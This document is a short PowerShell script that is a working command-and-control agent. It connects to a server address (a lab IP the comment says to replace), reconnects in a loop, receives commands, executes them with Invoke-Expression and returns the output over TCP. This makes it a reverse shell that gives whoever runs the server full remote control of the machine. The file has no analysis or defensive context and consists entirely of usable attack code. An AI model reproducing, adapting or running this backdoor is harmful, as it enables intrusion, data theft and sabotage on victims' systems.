# Define the server's IP address and port
$SERVER_HOST = "192.168.56.105"  # Replace with the server's IP address
$SERVER_PORT = 9997

# Create a TCP client object
$TCPClient = New-Object Net.Sockets.TCPClient

# Function to establish connection to C2 server
function Connect-ToC2 {
    try {
        $TCPClient.Connect($SERVER_HOST, $SERVER_PORT)
        return $true
    } catch {
        return $false
    }
}

# Function to send data to C2 server
function Send-DataToC2 {
    param(
        [string]$Data
    )
    $Stream = $TCPClient.GetStream()
    $Writer = New-Object IO.StreamWriter($Stream)
    $Writer.WriteLine($Data)
    $Writer.Flush()
}

# Function to receive data from C2 server
function Receive-DataFromC2 {
    $Stream = $TCPClient.GetStream()
    $Reader = New-Object IO.StreamReader($Stream)
    $Reader.ReadLine()
}

# Main loop
while ($true) {
    # Attempt to connect to C2 server
    if (-not $TCPClient.Connected) {
        if (-not (Connect-ToC2)) {
            Start-Sleep -Seconds 1
            continue
        }
    }

    # Receive command from C2 server
    $Command = Receive-DataFromC2

    # Execute command and send output back to C2 server
    try {
        $Output = Invoke-Expression $Command 2>&1
        Send-DataToC2 -Data $Output
    } catch {
        Send-DataToC2 -Data $_.Exception.Message
    }
}
